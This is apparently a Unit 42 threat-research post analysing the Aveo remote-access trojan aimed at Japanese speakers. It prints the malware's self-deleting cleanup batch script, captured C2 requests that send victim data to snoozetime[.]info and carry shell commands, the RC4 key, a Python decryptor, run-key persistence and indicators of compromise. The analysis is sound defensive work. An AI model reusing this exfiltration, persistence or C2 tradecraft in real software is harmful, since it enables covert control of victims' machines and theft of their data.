Aveo Malware Family Targets Japanese Speaking Users
researchcenter.paloaltonetworks.com/2016/08/unit42-aveo-malware-family-targets-japanese-speaking-users/

Josh Grunzweig, Robert Falcone August 16, 2016

By Josh Grunzweig and Robert Falcone

August 16, 2016 at 11:00 PM

Category: Malware, Threat Prevention, Unit 42

Tags: Aveo, FormerFirstRAT, Ido Laboratory, microsoft, snoozetime

This post is also available in: 日本語 (Japanese)

Palo Alto Networks has identified a malware family known as ‘Aveo’ that is being used to target Japanese speaking users. The ‘Aveo’ malware
name comes from an embedded debug string within the binary file. The Aveo malware family has close ties to the previously discussed
FormerFirstRAT malware family, which was also witnessed being used against Japanese targets. Aveo is disguised as a Microsoft Excel
document, and drops a decoy document upon execution. The decoy document in question is related to a research initiative led by the Ido
Laboratory at the Saitama Institute of Technology. Upon execution, the Aveo malware accepts a number of commands, allowing attackers to
take full control over the victim machine.

Deployment
The Aveo malware sample disguises itself as a Microsoft Excel document, as the icon below demonstrates. Note that the filename of
‘malware.exe’ is simply a placeholder, as the original filename is unknown.

Figure 1 Microsoft Excel icon used by Aveo malware

The executable is in fact a WinRAR self-extracting executable file, which will drop the decoy document and Aveo Trojan upon execution. The
following decoy document is dropped and subsequently opened when run.

1/6



Figure 2 Decoy document used with Aveo malware

This decoy document is hosted on the Ido Laboratory and contains information about a 2016 research initiative. The document lists
participants in the 16th CAVE workshop, including names, affiliations, and email addresses of those involved. The document, written in
Japanese, as well as the filename of this document, “CAVE研究会参加者.xls”, indicates that this malware was used to target one or more
Japanese speaking individuals. Additionally, the similarities between the Aveo and FormerFirstRAT malware families, which will be discussed
later in the post, further add evidence that Japanese speakers are being targeted.

Infrastructure
The Aveo Trojan is configured to communicate with the following domain name over HTTP.

snoozetime[.]info

This domain was first registered in May 2015 to ‘jack.ondo@mail.com’. Since that time, it has since been associated with the following three IP
addresses:

104.202.173[.]82
107.180.36[.]179
50.63.202[.]38

All IP addresses in question are located within the United States.

Figure 3 PassiveTotal screenshot showing associated IP addresses with snoozetime[.]info

2/6



The WHOIS information for snoozetime[.]info lists a registrant email address of ‘jack.ondo@mail[.]com’ and a name of ‘aygt5ruhrj aygt5ruhrj
gerhjrt’. Pivoting off of these two pieces of information to domains that share the same yields the following additional domains and email
addresses.

bluepaint[.]info
coinpack[.]info
7b7p[.]info
donkeyhaws[.]info
europcubit[.]com
jhmiyh.ny@gmail[.]com
844148030@qq[.]com

Malware Analysis
After running the self-extracting executable, a number of files are dropped to the file system and the following execution flow is witnessed:

Figure 4 Malware execution flow

When the mshelp32.exe executable runs, it begins by reading in the setting32.ini file, which contains the name of the decoy document. This
information is used to build a batch script, such as the following.

1 @echo off
2 copy "CAVE研究会参加者.xls" "C:\Documents and
3 Settings\Administrator\Desktop\8101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4d.xls" /Y
4 del "CAVE研究会参加者.xls" /F /Q
5 del mshelp32.exe /F /Q
6 del setting32.ini /F /Q
7 del "C:\Documents and

Settings\Administrator\Desktop\8101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4d.exe"  /F /Q
del %0 /F /Q

This batch script is executed within a new process, and acts as a simple cleanup script that runs after Aveo and the decoy document are
executed.

Aveo Malware Family
The Aveo malware initially runs an install routine, which will copy itself to the following location:

%APPDATA%\MMC\MMC.exe

If for any reason the %APPDATA%\MMC directory is unable to be created, Aveo will use %TEMP% instead of %APPDATA%.

After the malware copies itself, it will execute MMC.exe in a new process with an argument of the original filename. When executed, if this
single argument is provided, the malware will delete the file path provided.

After the installation routine completes, Aveo will exfiltrate the following victim information to a remote server via HTTP.

Unique victim hash
IP Address
Microsoft Windows version
Username
ANSI code page identifier

This information is exfiltrated to the ‘snoozetime[.]info’ domain, as seen in the following example HTTP request:

3/6



1 GET /index.php?id=35467&1=ySxlp03YGm0-&2=yiFi6hjbFHf9UtL44RPQ&4=zTZh6h7bHGjiUMzn&5=sXcjrAmqXiyiGJWzuUQ-
2 &6=yipl9g-- HTTP/1.1
3 Accept: */*
4 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
5 Host: snoozetime[.]info

Cache-Control: no-cache

To encrypt the provided data, the malware makes use of the RC4 algorithm, using a key of ‘hello’. As shown in the following image, the
encryption routines between Aveo and FormerFirstRAT are almost identical, with only the algorithms and keys being changed.

 

Figure 5 Comparison of encryption function between Aveo and FormerFirstRAT

In order to decrypt the data provided via HTTP, the following code may be used:

1 import base64
2 from binascii import *
3 from struct import *
4 from wincrypto import CryptCreateHash, CryptHashData, CryptDeriveKey, CryptEncrypt, CryptDecrypt
5  
6 CALG_RC4 = 0x6801
7 CALG_MD5 = 0x8003
8  
9 def decrypt(data):
10   md5_hasher = CryptCreateHash(CALG_MD5)
11   CryptHashData(md5_hasher, 'hello')
12   generated_key = CryptDeriveKey(md5_hasher, CALG_RC4)
13   decrypted_data = CryptDecrypt(generated_key, data)
14   return decrypted_data
15  
16 for a in 'index.php?id=35467&1=niBo9x/bFG4-&2=yi9i6hjbAmD5TNPu5A--&4=zTZh6h7bHGjiUMzn&5=sXcjrAmqXiyiGJWzuUQ-
17 &6=yipl9g--'.split("&")[1:]:
18   k,v = a.split("=")
19   decrypted = decrypt(base64.b64decode(v.replace("-","=")))

  print "[+] Parameter {} Decrypted: {}".format(k, decrypted)

Running the code above yields the following results:

1 [+] Parameter 1 Decrypted: e8836687
2 [+] Parameter 2 Decrypted: 172.16.95.184
3 [+] Parameter 4 Decrypted: 6.1.7601.2.1
4 [+] Parameter 5 Decrypted: Josh Grunzweig
5 [+] Parameter 6 Decrypted: 1252

After the initial victim information is exfiltrated, the malware expects a response of ‘OK’. Afterwards, Aveo will spawn a new thread that is
responsible for handling interactive command requests received by the command and control (C2) server, as well as requests to spawn an
interactive shell.

Aveo proceeds to set the following registry key to point towards the malware’s path, thus ensuring persistence across reboots:

HKCU\software\microsoft\windows\currentversion\run\msnetbridge

A command handler loop is then entered, where Aveo will accept commands from the remote C2. While the Aveo malware family awaits a
response, it will perform sleep delays of randomly chosen intervals between 0 and 3276 milliseconds. Should the C2 server respond with
‘toyota’, it will set that interval to 60 seconds. Aveo accepts the following commands, shown with their associated function.

1 : Execute command in interactive shell
2 : Get file attributes
3 : Write file
4 : Read file
5 : List drives

4/6



6 : Execute DIR command against path

The following example request demonstrates the C2 server sending the ‘ipconfig’ command to the Aveo malware.

C2 Request

1 GET /index.php?id=35468&1=niBo9x/bFG4- HTTP/1.1
2 Accept: */*
3 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
4 Host: snoozetime[.]info
5 Cache-Control: no-cache
6  
7 HTTP/1.0 200 OK
8 Content-Type: text/html; charset=utf-8
9 Content-Length: 11
10 Server: Werkzeug/0.11.10 Python/2.7.5
11 Date: Wed, 10 Aug 2016 16:00:11 GMT
12  
13 \xca89\xb4J\x82B?\xa5\x05\xe8
14  
15 [Decrypted]
16 1 ipconfig

Aveo Response

1 POST /index.php?id=35469&1=niBo9x/bFG4- HTTP/1.1
2 Accept: */*
3 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
4 Host: snoozetime[.]info
5 Content-Length: 1006
6 Cache-Control: no-cache
7  
8 \xca\x38\x39\xb4\x4a\x82\x42\x3f\xa5\x05\xe8\xdb\xda\x74\x8b\x79\x39\x46\xf2\x42\x1f\xcd\x39\xf3\x65\x1d\xda\x49\x40\x6c\x5e\x6e\xab\x7
9 [Truncated]
10  
11 [Decrypted]
12 1 ipconfig
13  
14 Windows IP Configuration
15  
16  
17 Ethernet adapter Bluetooth Network Connection:
18  
19    Media State . . . . . . . . . . . : Media disconnected
20    Connection-specific DNS Suffix  . :
21 [Truncated]

Conclusion
Aveo shares a number of characteristics with FormerFirstRAT, including encryption routines, code reuse, and similarities in C2 functionality.
Aveo is far from the most sophisticated malware family around. As witnessed in the previously discussed FormerFirstRAT sample, this related
malware family also looks to be targeting Japanese speaking users. Using a self-extracting WinRAR file, the malware drops a decoy
document, a copy of the Aveo malware, and a cleanup script.

Palo Alto Networks customers are protected from this threat in the following ways:

An AutoFocus tag has been created to track and monitor this threat
WildFire classifies Aveo samples as malicious
C2 domains listed in this report are blocked through Threat Prevention.

Indicators of Compromise
SHA256 Hashes

9dccfdd2a503ef8614189225bbbac11ee6027590c577afcaada7e042e18625e2
8101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4d 

C2 Domains

snoozetime[.]info

Registry Keys

5/6



HKCU\software\microsoft\windows\currentversion\run\msnetbridge

File Paths

%APPDATA%\MMC\MMC.exe
%TEMP%\MMC\MMC.exe

Get updates from 
Palo Alto
Networks!
Sign up to receive the latest news, cyber threat intelligence and research from us

By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.